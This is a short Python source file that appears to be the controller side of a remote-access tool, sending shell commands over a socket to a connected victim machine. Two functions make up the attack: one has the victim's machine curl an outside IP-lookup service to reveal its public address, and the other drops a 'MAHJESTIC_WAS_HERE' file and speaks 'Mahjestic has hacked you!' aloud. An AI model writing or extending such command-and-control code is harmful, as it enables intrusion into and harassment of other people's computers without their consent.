import socket
import chalk


def send_command(clientsocket: socket.socket, cmd: str):
    clientsocket.send(bytes(cmd, "utf-8"))


def ip(clientsocket: socket.socket, address: tuple):
    send_command(clientsocket, 'curl "https://api.ipify.org"')


def scare(clientsocket: socket.socket, address: tuple):
    send_command(clientsocket, 'echo "" > MAHJESTIC_WAS_HERE')
    send_command(clientsocket, "say Mahjestic has hacked you!")
